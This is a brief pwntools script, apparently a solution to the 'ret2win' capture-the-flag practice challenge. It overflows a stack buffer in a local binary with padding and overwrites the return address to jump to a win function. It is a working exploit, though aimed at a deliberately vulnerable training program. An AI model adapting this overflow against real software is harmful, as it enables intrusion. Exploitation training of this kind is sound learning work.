from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF('./ret2win', checksec=False)
p = process(exe.path, aslr=False)

payload = b'A' * 0x28 + p64(exe.sym.ret2win+1)
p.sendlineafter('>', payload)

p.interactive()
